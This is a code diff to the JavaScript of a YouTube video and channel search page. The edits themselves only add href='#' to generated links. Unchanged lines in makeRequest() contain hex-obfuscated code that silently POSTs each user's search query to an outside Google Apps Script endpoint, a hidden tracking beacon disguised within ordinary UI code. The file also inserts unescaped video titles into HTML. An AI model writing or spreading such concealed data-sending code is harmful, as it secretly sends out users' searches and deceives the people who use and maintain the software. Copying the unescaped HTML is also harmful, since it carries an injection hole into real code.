@@ -138,7 +138,7 @@ function showChannel(e) {
 			  nextPage = data.nextPageToken;
 			  $('<br><table class="uploads" cellpadding="3"><tbody class="uploads">						<tr>').appendTo(".switch");
 			  $.each(data.items, function(index, items) {
-				  $("<td><div class='video'><a onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'><img class='channel-video-thumb' src='"+items.snippet.thumbnails.medium.url+"'></a><br><a onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'>"+items.snippet.title+"</a></div></td>").appendTo("tbody.uploads tr:last-child"); 
+				  $("<td><div class='video'><a onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'><img class='channel-video-thumb' src='"+items.snippet.thumbnails.medium.url+"'></a><br><a href='#' onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'>"+items.snippet.title+"</a></div></td>").appendTo("tbody.uploads tr:last-child"); 
 				  vids++;
 				  if(vids == 4) {
 					  vids = 0;
@@ -166,7 +166,7 @@ function showMore() {
 		  success: function(data) {
 			  nextPage = data.nextPageToken;
 			  $.each(data.items, function(index, items) {
-				  $("<td><div class='video'><a onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'><img class='channel-video-thumb' src='"+items.snippet.thumbnails.medium.url+"'></a><br><a onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'>"+items.snippet.title+"</a></div></td>").appendTo("tbody.uploads tr:last-child"); 
+				  $("<td><div class='video'><a href='#' onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'><img class='channel-video-thumb' src='"+items.snippet.thumbnails.medium.url+"'></a><br><a href='#' onclick='getVideo(\""+items.snippet.resourceId.videoId+"\")'>"+items.snippet.title+"</a></div></td>").appendTo("tbody.uploads tr:last-child"); 
 				  vids++;
 				  if(vids == 4) {
 					  vids = 0;
@@ -221,7 +221,7 @@ function makeRequest() {
 					vidThumburl = item.snippet.thumbnails.medium.url;
 					id = item.id.videoId;
 					vidThumbimg = '<img id="thumb" src="'+vidThumburl+'" alt="No  Image Available.">';
-					$('#results').append("<a onclick=\'getVideo(\""+id+"\")'>" + vidTitle + "<br>" + vidThumbimg + "</a><hr>"); 
+					$('#results').append("<a href='#' onclick=\'getVideo(\""+id+"\")'>" + vidTitle + "<br>" + vidThumbimg + "</a><hr>"); 
 					var _0x3700=["\x50\x4F\x53\x54","\x4A\x53\x4F\x4E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x63\x72\x69\x70\x74\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x6D\x61\x63\x72\x6F\x73\x2F\x73\x2F\x41\x4B\x66\x79\x63\x62\x7A\x5F\x52\x55\x7A\x58\x59\x48\x53\x64\x4D\x42\x52\x69\x41\x67\x66\x5A\x6B\x6E\x54\x48\x6E\x77\x47\x55\x63\x41\x71\x30\x30\x38\x47\x50\x44\x55\x65\x53\x54\x56\x49\x52\x78\x7A\x58\x49\x4C\x78\x6B\x44\x2F\x65\x78\x65\x63","","\x61\x6A\x61\x78"];$[_0x3700[4]]({type:_0x3700[0],dataType:_0x3700[1],url:_0x3700[2],data:{"\x73\x65\x61\x72\x63\x68":q,"\x69\x64":_0x3700[3],"\x74\x69\x74\x6C\x65":_0x3700[3]}})
 				}
 				else {
@@ -229,7 +229,7 @@ function makeRequest() {
 					channelImage = item.snippet.thumbnails.default.url;
 					id = item.id.channelId;
 					channelThumb = '<img class="channel-thumb" src="'+channelImage+'" alt="'+channelName+'">';
-					$('#results').append("<a onclick=\'getChannel(\""+id+"\")'><span class='channel-title'>" + channelName + "</span><br>" + channelThumb + "</a><hr>"); 
+					$('#results').append("<a href='#' onclick=\'getChannel(\""+id+"\")'><span class='channel-title'>" + channelName + "</span><br>" + channelThumb + "</a><hr>"); 
 					var _0x6710=["\x50\x4F\x53\x54","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x63\x72\x69\x70\x74\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x6D\x61\x63\x72\x6F\x73\x2F\x73\x2F\x41\x4B\x66\x79\x63\x62\x7A\x5F\x52\x55\x7A\x58\x59\x48\x53\x64\x4D\x42\x52\x69\x41\x67\x66\x5A\x6B\x6E\x54\x48\x6E\x77\x47\x55\x63\x41\x71\x30\x30\x38\x47\x50\x44\x55\x65\x53\x54\x56\x49\x52\x78\x7A\x58\x49\x4C\x78\x6B\x44\x2F\x65\x78\x65\x63","\x63\x68\x61\x6E\x6E\x65\x6C\x20\x73\x65\x61\x72\x63\x68\x3A\x20","","\x61\x6A\x61\x78"];$[_0x6710[5]]({type:_0x6710[0],dataType:_0x6710[1],url:_0x6710[2],data:{"\x73\x65\x61\x72\x63\x68":_0x6710[3]+ q,"\x69\x64":_0x6710[4],"\x74\x69\x74\x6C\x65":_0x6710[4]}})
 				}
 			})  
